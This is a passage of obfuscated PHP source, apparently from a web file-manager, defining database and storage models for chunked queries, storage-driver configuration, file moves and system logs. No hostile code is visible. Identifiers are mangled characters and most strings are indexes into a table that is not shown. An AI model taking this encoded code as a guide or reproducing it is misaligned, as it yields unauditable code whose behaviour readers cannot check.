$Ÿ”Â©å¨ = count($Í©…¢ÈÇ); for ($Ìú²±ÎÍ = 0; $Ìú²±ÎÍ < $Ÿ”Â©å¨; $Ìú²±ÎÍ += $ Â½›Éš) { $©òÛ»À– = array_slice($Í©…¢ÈÇ, $Ìú²±ÎÍ, $ Â½›Éš); if (!is_array($©òÛ»À–) || count($©òÛ»À–) == 0) { break; } $‘¥ƒí£[$Ã‹İÄ“û[328]][$ÃÀ„ï¿í][1] = $©òÛ»À–; $this->optionsValue($‘¥ƒí£); $Ş¿Ù¸çõ += parent::save($˜§ÃÒŸ´, $†‹‹šÙ÷); $this->chunkEventCheck(count($©òÛ»À–)); } $this->chunkEventSet(); return $Ş¿Ù¸çõ; } public function add($ÎŞğñ¸ò = '', $‰šÇç÷ = array(), $ûÁ—‰é = false) { if ($this->addTaskStatus && is_array($ÎŞğñ¸ò)) { $this->addTaskData[] = $ÎŞğñ¸ò; return; } return parent::add($ÎŞğñ¸ò, $‰šÇç÷, $ûÁ—‰é); } public function parseWhereLike($äÜàª•ô, $¬’ùáÀ = '', $–µ”«± = false, &$ŸÊôè¸µ = false) { $Æµ¯â€– =& $_SERVER[‚ûòÉ˜ş]; $¡ã¹Ï¶İ = $GLOBALS[$Æµ¯â€–[6]][$Æµ¯â€–[433]]; if (!$¡ã¹Ï¶İ[$Æµ¯â€–[434]]) { return $äÜàª•ô; } if (!is_array($äÜàª•ô)) { return $äÜàª•ô; } $¹Ê‚œè = array(); $ºò¡Éİ• = 0; foreach ($äÜàª•ô as $Ì¹¢»¬‰ => $¢ßéäÍ€) { if (is_array($¢ßéäÍ€) && count($¢ßéäÍ€) == 2 && $¢ßéäÍ€[0] == $Æµ¯â€–[435] && is_string($¢ßéäÍ€[1]) && substr($¢ßéäÍ€[1], 0, 1) == $Æµ¯â€–[436] && substr($¢ßéäÍ€[1], strlen($¢ßéäÍ€[1]) - 1, 1) == $Æµ¯â€–[436]) { $ŸÊôè¸µ = !0; $ŠØ¦‘”  = is_string($Ì¹¢»¬‰) ? $Ì¹¢»¬‰ : $¬’ùáÀ; $Ì®àÊˆ = substr($¢ßéäÍ€[1], 1, strlen($¢ßéäÍ€[1]) - 2); $Ì®àÊˆ = $this->db->escapeString($Ì®àÊˆ); if (!strpos($ŠØ¦‘” , $Æµ¯â€–[10])) { $ŠØ¦‘”  = $Æµ¯â€–[437] . $ŠØ¦‘”  . $Æµ¯â€–[437]; } $É¤æ¢ªü = $Æµ¯â€–[213] . $Ì®àÊˆ . $Æµ¯â€–[213]; $Ì®àÊˆ = str_replace(array($Æµ¯â€–[10], $Æµ¯â€–[438], $Æµ¯â€–[11]), $Æµ¯â€–[439], $Ì®àÊˆ); if ($¡ã¹Ï¶İ[$Æµ¯â€–[440]]) { $É¤æ¢ªü = $Æµ¯â€–[441] . $Ì®àÊˆ . $Æµ¯â€–[442]; if ($¡ã¹Ï¶İ[$Æµ¯â€–[443]]) { $É¤æ¢ªü = $Æµ¯â€–[442] . $Ì®àÊˆ . $Æµ¯â€–[441]; } } $¹Ê‚œè[$ºò¡Éİ•] = $Æµ¯â€–[444] . $ŠØ¦‘”  . $Æµ¯â€–[445] . $É¤æ¢ªü . $Æµ¯â€–[446]; $ºò¡Éİ•++; continue; } if (is_array($¢ßéäÍ€)) { $¬’ùáÀ = is_string($Ì¹¢»¬‰) ? $Ì¹¢»¬‰ : $¬’ùáÀ; $¢ßéäÍ€ = $this->parseWhereLike($¢ßéäÍ€, $¬’ùáÀ, !0, $ŸÊôè¸µ); } if (is_numeric($Ì¹¢»¬‰)) { $¹Ê‚œè[$ºò¡Éİ•] = $¢ßéäÍ€; $ºò¡Éİ•++; } else { $¹Ê‚œè[$Ì¹¢»¬‰] = $¢ßéäÍ€; } } if ($ŸÊôè¸µ && !$–µ”«±) { } return $¹Ê‚œè; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ì‹ó•œé = array()) { $ùÖÀ¬Èô =& $_SERVER[‚ûòÉ˜ş]; $ÓÕè¢·Ò = self::SQL_WHERE_IN_CHUNK; $ªø¡Ä¶¦ = $this->optionsValue(); $şÓçæ³¢ = $this->findWhereField($ªø¡Ä¶¦); if (!$şÓçæ³¢ || isset($ªø¡Ä¶¦[$ùÖÀ¬Èô[345]]) || isset($ªø¡Ä¶¦[$ùÖÀ¬Èô[406]])) { return parent::select($ì‹ó•œé); } $äêä´¼§ = $ªø¡Ä¶¦[$ùÖÀ¬Èô[328]][$şÓçæ³¢][1]; $äêä´¼§ = is_array($äêä´¼§) ? $äêä´¼§ : array(); $œİ×²‰ = null; for ($š¯ŒÁóò = 0; $š¯ŒÁóò < count($äêä´¼§); $š¯ŒÁóò += $ÓÕè¢·Ò) { $êœàîĞ = array_slice($äêä´¼§, $š¯ŒÁóò, $ÓÕè¢·Ò); if (!is_array($êœàîĞ) || count($êœàîĞ) == 0) { break; } $ªø¡Ä¶¦[$ùÖÀ¬Èô[328]][$şÓçæ³¢][1] = $êœàîĞ; $this->optionsValue($ªø¡Ä¶¦); $«Ö½Œûµ = parent::select($ì‹ó•œé); if (!$«Ö½Œûµ) { continue; } $œİ×²‰ = is_array($œİ×²‰) ? $œİ×²‰ : array(); $œİ×²‰ = array_merge($œİ×²‰, $«Ö½Œûµ); } return $œİ×²‰; } public function delete($˜’÷ïßå = array()) { $Î±ê‰ØŸ =& $_SERVER[‚ûòÉ˜ş]; $î„í®îı = self::SQL_WHERE_IN_CHUNK; $è‡¡ ¿ = $this->optionsValue(); $ì­ùÓ = $this->findWhereField($è‡¡ ¿); if (!$ì­ùÓ) { return parent::delete($˜’÷ïßå); } $ï Š‹ªü = 0; $‘ç¶’ª = $è‡¡ ¿[$Î±ê‰ØŸ[328]][$ì­ùÓ][1]; $‘ç¶’ª = is_array($‘ç¶’ª) ? $‘ç¶’ª : array(); for ($ˆÔ½ÌÛÚ = 0; $ˆÔ½ÌÛÚ < count($‘ç¶’ª); $ˆÔ½ÌÛÚ += $î„í®îı) { $ˆ¨äÚúæ = array_slice($‘ç¶’ª, $ˆÔ½ÌÛÚ, $î„í®îı); if (!is_array($ˆ¨äÚúæ) || count($ˆ¨äÚúæ) == 0) { break; } $è‡¡ ¿[$Î±ê‰ØŸ[328]][$ì­ùÓ][1] = $ˆ¨äÚúæ; $this->optionsValue($è‡¡ ¿); $ï Š‹ªü += parent::delete($˜’÷ïßå); } return $ï Š‹ªü; } private function findWhereField($İµ¹»Ä¼) { $ ˆÑŒµ =& $_SERVER[‚ûòÉ˜ş]; $˜”ĞáıÙ = self::SQL_WHERE_IN_CHUNK; if (!is_array($İµ¹»Ä¼) || !is_array($İµ¹»Ä¼[$ ˆÑŒµ[328]])) { return !1; } foreach ($İµ¹»Ä¼[$ ˆÑŒµ[328]] as $­êèúñ´ => $àä´Ğã) { if (is_array($àä´Ğã) && isset($àä´Ğã[0]) && is_string($àä´Ğã[0]) && strtolower($àä´Ğã[0]) == $ ˆÑŒµ[7] && is_array($àä´Ğã[1]) && count($àä´Ğã[1]) > $˜”ĞáıÙ) { ignore_timeout(); return $­êèúñ´; } } return !1; } public function setMasterDB($–ì‚±ö— = true) { think_config($_SERVER[‚ûòÉ˜ş][447], $–ì‚±ö—); } } goto dô ²¸İ; BÚÅ ¶Íéø: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\164\157\x72\141\x67\x65\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\163\x69\172\x65\x4d\141\x78", "\x73\171\163\164\145\x6d", "\x64\145\x66\x61\x75\154\164", "\144\x72\151\166\145\162", "\x63\157\156\146\151\x67"); public function listData($¼­©©¬ = false, $é¡èâŒ‰ = "\x6d\157\144\151\146\171\x54\151\x6d\145", $Úí¿¡ûÁ = false) { $ÉÉÖêŸ‹ =& $_SERVER[‚ûòÉ˜ş]; $²”¬ñàÕ = parent::listData($¼­©©¬, $é¡èâŒ‰, $Úí¿¡ûÁ); if ($¼­©©¬) { return $²”¬ñàÕ; } $¡Ê‚‹Î¤ = $this->ioSizeUseGet(array_to_keyvalue($²”¬ñàÕ, $ÉÉÖêŸ‹[12], $ÉÉÖêŸ‹[451])); foreach ($²”¬ñàÕ as $õçùñ‘ù => $¾’¶óòÜ) { unset($²”¬ñàÕ[$õçùñ‘ù][$ÉÉÖêŸ‹[6]]); $²”¬ñàÕ[$õçùñ‘ù][$ÉÉÖêŸ‹[1874]] = isset($¡Ê‚‹Î¤[$¾’¶óòÜ[$ÉÉÖêŸ‹[451]]]) ? $¡Ê‚‹Î¤[$¾’¶óòÜ[$ÉÉÖêŸ‹[451]]] : 0; } return $²”¬ñàÕ; } public function ioSizeUseGet($‹ÂÖÍ³) { $÷ô¿¢Ë =& $_SERVER[‚ûòÉ˜ş]; if (!$‹ÂÖÍ³) { return array(); } $‘ñ¦•Ù = $÷ô¿¢Ë[2205] . implode($÷ô¿¢Ë[60], $‹ÂÖÍ³); $Áú’í°„ = Cache::get($‘ñ¦•Ù); if ($Áú’í°„) { return $Áú’í°„; } $úÌèÊ…å = array($÷ô¿¢Ë[857] => $÷ô¿¢Ë[451], $÷ô¿¢Ë[2206] => $÷ô¿¢Ë[86]); $šÔ¹‚Ö = array($÷ô¿¢Ë[857] => array($÷ô¿¢Ë[7], $‹ÂÖÍ³)); $Áú’í°„ = Model($÷ô¿¢Ë[829])->field($úÌèÊ…å)->where($šÔ¹‚Ö)->group($÷ô¿¢Ë[857])->select(); $Áú’í°„ = array_to_keyvalue($Áú’í°„, $÷ô¿¢Ë[451], $÷ô¿¢Ë[86]); Cache::set($‘ñ¦•Ù, $Áú’í°„, 600); return $Áú’í°„; } public function getConfig($¼£…„ÔÖ) { $ä»ŒÇÒ¢ = parent::listData($¼£…„ÔÖ); return json_decode($ä»ŒÇÒ¢[$_SERVER[‚ûòÉ˜ş][6]], !0); } public function update($·ìù«ç, $çìµ§½Ú) { $ıˆ·‹ü =& $_SERVER[‚ûòÉ˜ş]; $ÛêËå¿Š = $çìµ§½Ú[$ıˆ·‹ü[42]]; $çéÎÖåÙ = array_to_keyvalue(parent::listData(), $ıˆ·‹ü[42]); if (isset($çéÎÖåÙ[$ÛêËå¿Š]) && $çéÎÖåÙ[$ÛêËå¿Š][$ıˆ·‹ü[451]] != $·ìù«ç) { return !1; } $this->checkPwd($·ìù«ç, $çìµ§½Ú); if (isset($çìµ§½Ú[$ıˆ·‹ü[2207]]) && $çìµ§½Ú[$ıˆ·‹ü[2207]] == $ıˆ·‹ü[98]) { $this->checkConfig($çìµ§½Ú); } unset($çìµ§½Ú[$ıˆ·‹ü[2207]]); $úşÊºĞù = parent::update($·ìù«ç, $çìµ§½Ú); if ($úşÊºĞù && $çìµ§½Ú[$ıˆ·‹ü[47]]) { $¢¼£ì•ƒ = 0; foreach ($çéÎÖåÙ as $Ã«›ãÕ¸) { if ($Ã«›ãÕ¸[$ıˆ·‹ü[47]] && $Ã«›ãÕ¸[$ıˆ·‹ü[451]] != $·ìù«ç) { $¢¼£ì•ƒ = $Ã«›ãÕ¸[$ıˆ·‹ü[451]]; parent::update($Ã«›ãÕ¸[$ıˆ·‹ü[451]], array($ıˆ·‹ü[47] => 0)); } } $this->updateBackup($·ìù«ç, $¢¼£ì•ƒ); } return $úşÊºĞù; } public function add($ËÎ’œ±) { $æà¾ÉÈè =& $_SERVER[‚ûòÉ˜ş]; $“Áµø•… = array_to_keyvalue(parent::listData(), $æà¾ÉÈè[42]); if (isset($“Áµø•…[$ËÎ’œ±[$æà¾ÉÈè[42]]])) { return !1; } $this->checkConfig($ËÎ’œ±); $íàâğä¦ = parent::insert($ËÎ’œ±); if ($íàâğä¦ && $ËÎ’œ±[$æà¾ÉÈè[47]]) { foreach ($“Áµø•… as $ş£îïò´) { if ($ş£îïò´[$æà¾ÉÈè[47]]) { parent::update($ş£îïò´[$æà¾ÉÈè[451]], array($æà¾ÉÈè[47] => 0)); } } } return $íàâğä¦; } public function updateBackup($àÎÚè, $Ã¢ÈŸË) { $ÌÚâà³İ =& $_SERVER[‚ûòÉ˜ş]; if (!$Ã¢ÈŸË) { return; } $üá·„§à = Model($ÌÚâà³İ[789])->config(); if ($üá·„§à[$ÌÚâà³İ[1657]] != $ÌÚâà³İ[98] || $üá·„§à[$ÌÚâà³İ[791]] != $Ã¢ÈŸË) { return; } $–¤éˆßœ = Model($ÌÚâà³İ[810])->get($ÌÚâà³İ[820]); $–¤éˆßœ = json_decode($–¤éˆßœ, !0); if (!$–¤éˆßœ) { return; } $–¤éˆßœ[$ÌÚâà³İ[791]] = $àÎÚè; Model($ÌÚâà³İ[810])->set(array($ÌÚâà³İ[820] => $–¤éˆßœ)); } public function checkPwd($óÔ¥â÷ò, &$øçöïÈ) { $õşŞÏÚ« =& $_SERVER[‚ûòÉ˜ş]; if (empty($øçöïÈ[$õşŞÏÚ«[6]])) { return; } $¸ï¸Õ«ı = json_decode($øçöïÈ[$õşŞÏÚ«[6]], !0); $äàõä±ù = $õşŞÏÚ«[12]; $•ü¾àÂ = array($õşŞÏÚ«[2208], $õşŞÏÚ«[2209], $õşŞÏÚ«[929]); foreach ($•ü¾àÂ as $Ë®¼ËıÕ) { if (isset($¸ï¸Õ«ı[$Ë®¼ËıÕ])) { $äàõä±ù = $Ë®¼ËıÕ; break; } } if (!$äàõä±ù) { return; } $æë„Ç = $this->getConfig($óÔ¥â÷ò); $õş¥Ä = $æë„Ç[$äàõä±ù]; $ÁÃµÜ€‹ = $¸ï¸Õ«ı[$äàõä±ù]; if ($ÁÃµÜ€‹ == str_repeat($õşŞÏÚ«[213], strlen($õş¥Ä))) { $¸ï¸Õ«ı[$äàõä±ù] = $õş¥Ä; $øçöïÈ[$õşŞÏÚ«[6]] = json_encode($¸ï¸Õ«ı); } else { if ($ÁÃµÜ€‹ != $õş¥Ä) { $øçöïÈ[$õşŞÏÚ«[2207]] = $õşŞÏÚ«[98]; } } } public function checkConfig(&$íªÒ¢§ä, $Ù‚ŒĞ—ò = false) { $ë‚Ûç¯¶ =& $_SERVER[‚ûòÉ˜ş]; $ §ÔŒüä = strtolower($íªÒ¢§ä[$ë‚Ûç¯¶[105]]); $øÅİÄ÷ = json_decode($íªÒ¢§ä[$ë‚Ûç¯¶[6]], !0); foreach ($øÅİÄ÷ as $Ï×¦¦Ëø => $¾ÒÛåÍÒ) { if (is_string($¾ÒÛåÍÒ)) { $øÅİÄ÷[$Ï×¦¦Ëø] = trim($¾ÒÛåÍÒ); } } $øÅİÄ÷[$ë‚Ûç¯¶[2210]] = rand_string(6); $ìçİ××Ô = $GLOBALS[$ë‚Ûç¯¶[6]][$ë‚Ûç¯¶[99]][$ë‚Ûç¯¶[866]]; $™åîø´Ç = isset($ìçİ××Ô[$ §ÔŒüä]) ? $ìçİ××Ô[$ §ÔŒüä] : ucfirst($ §ÔŒüä); $Éİ­ü¾’ = $ë‚Ûç¯¶[84] . $™åîø´Ç; if (!$™åîø´Ç || !class_exists($Éİ­ü¾’)) { if ($Ù‚ŒĞ—ò) { return LNG($ë‚Ûç¯¶[2211]); } write_log(array($ë‚Ûç¯¶[2212], $íªÒ¢§ä, get_caller_info()), $ë‚Ûç¯¶[2213]); show_json(LNG($ë‚Ûç¯¶[2211]), !1, $íªÒ¢§ä); } $ŞØâÃŞ™ = new $Éİ­ü¾’($øÅİÄ÷); if (in_array($ §ÔŒüä, $ŞØâÃŞ™->objectDriver)) { if (!$ŞØâÃŞ™->isBucketCors() && !$ŞØâÃŞ™->setBucketCors()) { $èñÍêÂ = LNG($ë‚Ûç¯¶[2214]); $èñÍêÂ .= $ë‚Ûç¯¶[2215] . LNG($ë‚Ûç¯¶[2216]); if ($Ù‚ŒĞ—ò) { return $èñÍêÂ; } show_json($èñÍêÂ, !1); } } $Ûá¥È‹Ö = rtrim($øÅİÄ÷[$ë‚Ûç¯¶[1221]], $ë‚Ûç¯¶[8]) . $ë‚Ûç¯¶[8]; $ÁßÈÃÃ = $ŞØâÃŞ™->getPath($Ûá¥È‹Ö . $ë‚Ûç¯¶[1225]); if (!$ŞØâÃŞ™->mkfile($ÁßÈÃÃ)) { if ($Ù‚ŒĞ—ò) { return LNG($ë‚Ûç¯¶[2214]); } show_json(LNG($ë‚Ûç¯¶[2214]), !1); } $øÅİÄ÷[$ë‚Ûç¯¶[1221]] = $Ûá¥È‹Ö; $íªÒ¢§ä[$ë‚Ûç¯¶[6]] = json_encode($øÅİÄ÷); $íªÒ¢§ä[$ë‚Ûç¯¶[105]] = $™åîø´Ç; return !0; } public function driverListSystem() { $’ñşÀ•« =& $_SERVER[‚ûòÉ˜ş]; $é¼âéÀÌ = parent::listData(); $óªï Š• = array(); foreach ($é¼âéÀÌ as $ÖªçñÔ—) { unset($ÖªçñÔ—[$’ñşÀ•«[225]], $ÖªçñÔ—[$’ñşÀ•«[95]]); $ÖªçñÔ—[$’ñşÀ•«[6]] = json_decode($ÖªçñÔ—[$’ñşÀ•«[6]], !0); $óªï Š•[] = $ÖªçñÔ—; } return $óªï Š•; } public function defaultDriver() { $Âæê…ş³ =& $_SERVER[‚ûòÉ˜ş]; $Êİ†äĞ = parent::listData(); $‚ƒÒıé = array_filter_by_field($Êİ†äĞ, $Âæê…ş³[47], 1); $‚ƒÒıé = $‚ƒÒıé[0]; if ($‚ƒÒıé) { $‚ƒÒıé[$Âæê…ş³[6]] = json_decode($‚ƒÒıé[$Âæê…ş³[6]], !0); } return $‚ƒÒıé; } public function driverInfo($üèÙšî“) { $Ùù‹ßÉı =& $_SERVER[‚ûòÉ˜ş]; $›•¤á¡ = array_to_keyvalue(parent::listData(), $Ùù‹ßÉı[451]); if (!isset($›•¤á¡[$üèÙšî“])) { return !1; } $óº×¡‘ä = $›•¤á¡[$üèÙšî“]; $óº×¡‘ä[$Ùù‹ßÉı[6]] = json_decode($óº×¡‘ä[$Ùù‹ßÉı[6]], !0); return $óº×¡‘ä; } public function remove($Å…Ë¼Èì) { $this->removeShareItems($Å…Ë¼Èì); return parent::remove($Å…Ë¼Èì); } public function removeWithFile($ê¿…›¤ , $Ã‘îğÛÁ) { $ºòÊê¸º =& $_SERVER[‚ûòÉ˜ş]; $áŠø¶»¬ = array($ºòÊê¸º[857] => $ê¿…›¤ ); $ºÓíŞ½Í = Model($ºòÊê¸º[520])->where($áŠø¶»¬)->count(); $¸éÂó±€ = Model($ºòÊê¸º[520])->where($áŠø¶»¬)->sum($ºòÊê¸º[86]); $Ò¤‘µòã = $Ã‘îğÛÁ . $ºòÊê¸º[2217] . $ê¿…›¤ ; $ÅÑù˜áã = LNG($Ã‘îğÛÁ == $ºòÊê¸º[596] ? $ºòÊê¸º[2218] : $ºòÊê¸º[2219]); $¶šç×«‘ = new TaskFileTransfer($Ò¤‘µòã, $ºòÊê¸º[2213], $ºÓíŞ½Í, $ÅÑù˜áã . "\50{$ê¿…›¤ }\51"); $¶šç×«‘->task[$ºòÊê¸º[803]] = (double) $¸éÂó±€; $ä®ˆ·· = KodIO::defaultDriver(); $Ëô»”ï— = $ä®ˆ··[$ºòÊê¸º[451]]; $úØßğÂë = "\173\x69\157\72{$Ëô»”ï—}\x7d\57"; $¤œš±‹› = !0; $ş¨Ÿ˜åû = array(); $¤×€ƒÏŞ = Model($ºòÊê¸º[224])->where($áŠø¶»¬)->field($ºòÊê¸º[2220])->select(); foreach ($¤×€ƒÏŞ as $ÛÉáúÑé) { $ù õĞœ = $ÛÉáúÑé[$ºòÊê¸º[94]]; $ô‰çÃ¢« = $úØßğÂë . str_replace("\173\151\157\x3a{$ê¿…›¤ }\175\x2f", $ºòÊê¸º[12], $ù õĞœ); if (!IO::exist($ù õĞœ)) { $ş¨Ÿ˜åû[] = $ÛÉáúÑé[$ºòÊê¸º[517]]; $¶šç×«‘->updateFileEnd($ÛÉáúÑé[$ºòÊê¸º[42]], $ÛÉáúÑé[$ºòÊê¸º[86]]); continue; } if (IO::exist($ô‰çÃ¢«)) { $¶šç×«‘->updateFileEnd($ÛÉáúÑé[$ºòÊê¸º[42]], $ÛÉáúÑé[$ºòÊê¸º[86]]); continue; } if (!IO::move($ù õĞœ, get_path_father($ô‰çÃ¢«))) { $¤œš±‹› = !1; break; } $áŠø¶»¬ = array($ºòÊê¸º[517] => $ÛÉáúÑé[$ºòÊê¸º[517]]); $ƒÅ©­Ö = array($ºòÊê¸º[857] => $Ëô»”ï—, $ºòÊê¸º[94] => $ô‰çÃ¢«); Model($ºòÊê¸º[224])->where($áŠø¶»¬)->save($ƒÅ©­Ö); } $this->removeByFileID($ş¨Ÿ˜åû); if (!$¤œš±‹›) { $¶šç×«‘->stop($Ò¤‘µòã); return !1; } $¶šç×«‘->end(); if ($Ã‘îğÛÁ == $ºòÊê¸º[1854]) { $this->remove($ê¿…›¤ ); } } public function progress($Éóèˆ‚ì, $Ã©—ûŒÃ) { return Task::get($Ã©—ûŒÃ . $_SERVER[‚ûòÉ˜ş][2217] . $Éóèˆ‚ì); } private function removeByFileID($õß•œõÕ = array()) { $ÉŒøŞ• =& $_SERVER[‚ûòÉ˜ş]; if (empty($õß•œõÕ)) { return; } $›µŒş« = array($ÉŒøŞ•[517] => array($ÉŒøŞ•[7], $õß•œõÕ)); $ëÕµ¤“ = Model($ÉŒøŞ•[1373])->where($›µŒş«)->field($ÉŒøŞ•[191])->select(); if (!$ëÕµ¤“) { return; } $ëÕµ¤“ = array_to_keyvalue($ëÕµ¤“, $ÉŒøŞ•[12], $ÉŒøŞ•[191]); foreach ($ëÕµ¤“ as $ë’íí–ö) { Model($ÉŒøŞ•[466])->removeNow($ë’íí–ö, !1); } } private function removeShareItems($Üæ’„û„) { $ë»Ò·šõ =& $_SERVER[‚ûòÉ˜ş]; $ÂóúÊÂÂ = "\x7b\151\157\72{$Üæ’„û„}\175\57"; $Ê˜‹Ğ§Ç = array($ë»Ò·šõ[191] => 0, $ë»Ò·šõ[1216] => array($ë»Ò·šõ[435], "{$ÂóúÊÂÂ}\45")); $‘è—ï² = Model($ë»Ò·šõ[1865])->where($Ê˜‹Ğ§Ç)->field($ë»Ò·šõ[641])->select(); if (empty($‘è—ï²)) { return; } $¼•¤«× = array_to_keyvalue($‘è—ï², $ë»Ò·šõ[12], $ë»Ò·šõ[641]); Model($ë»Ò·šõ[640])->remove($¼•¤«×); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x4c\151\147\150\x74\101\x70\x70"; public $modelType = "\123\171\163\x74\x65\x6d\117\x70\164\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\x67\x72\x6f\x75\160", "\x64\x65\x73\143", "\x63\x6f\156\x74\x65\156\x74"); public function listData($›ÏÉôßŸ = false, $Äô”ßÏ« = "\155\x6f\x64\151\146\x79\124\x69\155\x65", $ë±û½®Ò = true) { return parent::listData($›ÏÉôßŸ, $Äô”ßÏ«, $ë±û½®Ò); } public function remove($‡ÕÖ„Á´) { $¯—äÔ«¸ = $this->findByName($‡ÕÖ„Á´); if (!$¯—äÔ«¸) { return !1; } return parent::remove($¯—äÔ«¸[$_SERVER[‚ûòÉ˜ş][451]]); } public function add($ì«³ÙÔ) { if ($this->findByName($ì«³ÙÔ[$_SERVER[‚ûòÉ˜ş][42]])) { return !1; } return parent::insert($ì«³ÙÔ); } public function update($ÛËú•–‡, $¶æ¸¸•˜) { $ÉúÌÇŞ =& $_SERVER[‚ûòÉ˜ş]; $óúñˆ‰ = $this->findByName($ÛËú•–‡); $ØÛ¥•äì = $this->findByName($¶æ¸¸•˜[$ÉúÌÇŞ[42]]); if (!$óúñˆ‰ || $ØÛ¥•äì && $ØÛ¥•äì[$ÉúÌÇŞ[451]] != $óúñˆ‰[$ÉúÌÇŞ[451]]) { return !1; } return parent::update($óúñˆ‰[$ÉúÌÇŞ[451]], $¶æ¸¸•˜); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\x6d\x65", "\x74\151\155\x65", "\x69\156\163\145\x72\x74", "\x66\x75\156\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¿ÏğÏ®ğ =& $_SERVER[‚ûòÉ˜ş]; return array($¿ÏğÏ®ğ[2221] => LNG($¿ÏğÏ®ğ[2222]), $¿ÏğÏ®ğ[2223] => LNG($¿ÏğÏ®ğ[2224]), $¿ÏğÏ®ğ[1828] => LNG($¿ÏğÏ®ğ[2225]), $¿ÏğÏ®ğ[2226] => LNG($¿ÏğÏ®ğ[2227]), $¿ÏğÏ®ğ[2228] => LNG($¿ÏğÏ®ğ[2229]), $¿ÏğÏ®ğ[2230] => LNG($¿ÏğÏ®ğ[2231]), $¿ÏğÏ®ğ[2232] => LNG($¿ÏğÏ®ğ[2233]), $¿ÏğÏ®ğ[1858] => LNG($¿ÏğÏ®ğ[2233]), $¿ÏğÏ®ğ[1859] => LNG($¿ÏğÏ®ğ[2234]), $¿ÏğÏ®ğ[2235] => LNG($¿ÏğÏ®ğ[2236]), $¿ÏğÏ®ğ[2237] => LNG($¿ÏğÏ®ğ[2238]), $¿ÏğÏ®ğ[2239] => LNG($¿ÏğÏ®ğ[2240]), $¿ÏğÏ®ğ[2241] => LNG($¿ÏğÏ®ğ[2242]), $¿ÏğÏ®ğ[1856] => LNG($¿ÏğÏ®ğ[2243]), $¿ÏğÏ®ğ[2244] => LNG($¿ÏğÏ®ğ[2245]), $¿ÏğÏ®ğ[1863] => LNG($¿ÏğÏ®ğ[2246]), $¿ÏğÏ®ğ[2247] => LNG($¿ÏğÏ®ğ[2248]), $¿ÏğÏ®ğ[2249] => LNG($¿ÏğÏ®ğ[2250]), $¿ÏğÏ®ğ[2251] => LNG($¿ÏğÏ®ğ[2252]), $¿ÏğÏ®ğ[2253] => LNG($¿ÏğÏ®ğ[2254]), $¿ÏğÏ®ğ[1866] => LNG($¿ÏğÏ®ğ[2255]), $¿ÏğÏ®ğ[1867] => LNG($¿ÏğÏ®ğ[2256]), $¿ÏğÏ®ğ[2257] => LNG($¿ÏğÏ®ğ[2258]), $¿ÏğÏ®ğ[2259] => LNG($¿ÏğÏ®ğ[2260]), $¿ÏğÏ®ğ[2261] => LNG($¿ÏğÏ®ğ[2262]), $¿ÏğÏ®ğ[1861] => LNG($¿ÏğÏ®ğ[2263]), $¿ÏğÏ®ğ[2264] => LNG($¿ÏğÏ®ğ[2265]), $¿ÏğÏ®ğ[1860] => LNG($¿ÏğÏ®ğ[2266]), $¿ÏğÏ®ğ[2267] => LNG($¿ÏğÏ®ğ[2268]), $¿ÏğÏ®ğ[2269] => LNG($¿ÏğÏ®ğ[2270]), $¿ÏğÏ®ğ[2271] => LNG($¿ÏğÏ®ğ[2272]), $¿ÏğÏ®ğ[2273] => LNG($¿ÏğÏ®ğ[2273]), $¿ÏğÏ®ğ[2274] => LNG($¿ÏğÏ®ğ[1832]), $¿ÏğÏ®ğ[2275] => LNG($¿ÏğÏ®ğ[2276]), $¿ÏğÏ®ğ[2277] => LNG($¿ÏğÏ®ğ[2278]), $¿ÏğÏ®ğ[2279] => LNG($¿ÏğÏ®ğ[2280]), $¿ÏğÏ®ğ[2281] => LNG($¿ÏğÏ®ğ[2282]), $¿ÏğÏ®ğ[2283] => LNG($¿ÏğÏ®ğ[2284]), $¿ÏğÏ®ğ[2285] => LNG($¿ÏğÏ®ğ[2285]), $¿ÏğÏ®ğ[2286] => LNG($¿ÏğÏ®ğ[2287]), $¿ÏğÏ®ğ[2288] => LNG($¿ÏğÏ®ğ[2289]), $¿ÏğÏ®ğ[2290] => LNG($¿ÏğÏ®ğ[2291]), $¿ÏğÏ®ğ[2292] => LNG($¿ÏğÏ®ğ[2293]), $¿ÏğÏ®ğ[2294] => LNG($¿ÏğÏ®ğ[2295]), $¿ÏğÏ®ğ[2296] => LNG($¿ÏğÏ®ğ[2297])); } private function typeFile() { $…îÅšÇü =& $_SERVER[‚ûòÉ˜ş]; $¦îô”ëî = array($…îÅšÇü[1863] => array($…îÅšÇü[1864]), $…îÅšÇü[2239] => array($…îÅšÇü[2298]), $…îÅšÇü[2241] => array($…îÅšÇü[2299]), $…îÅšÇü[1856] => array($…îÅšÇü[1857], $…îÅšÇü[2300]), $…îÅšÇü[2249] => array(), $…îÅšÇü[2251] => array(), $…îÅšÇü[2253] => array(), $…îÅšÇü[1866] => array($…îÅšÇü[1868]), $…îÅšÇü[1867] => array($…îÅšÇü[1868]), $…îÅšÇü[2257] => array($…îÅšÇü[2301]), $…îÅšÇü[2259] => array($…îÅšÇü[2301]), $…îÅšÇü[2261] => array($…îÅšÇü[2302]), $…îÅšÇü[2247] => array($…îÅšÇü[2303]), $…îÅšÇü[1861] => array($…îÅšÇü[2304]), $…îÅšÇü[2264] => array($…îÅšÇü[2305]), $…îÅšÇü[1860] => array($…îÅšÇü[1862])); return $¦îô”ëî; } private function typeAll() { $å­ÕŒÂü =& $_SERVER[‚ûòÉ˜ş]; $¨ŒñÚáÈ = $this->typeList; $ì‘›¯ª = array_filter($this->typeFile()); foreach ($ì‘›¯ª as $Õ¥“Ê† => $ Üğ…³) { $¨ŒñÚáÈ[$ Üğ…³[0]] = $¨ŒñÚáÈ[$Õ¥“Ê†]; } $¨ŒñÚáÈ[$å­ÕŒÂü[1868]] = LNG($å­ÕŒÂü[2306]); $¨ŒñÚáÈ[$å­ÕŒÂü[2301]] = LNG($å­ÕŒÂü[2307]); return $¨ŒñÚáÈ; } public function 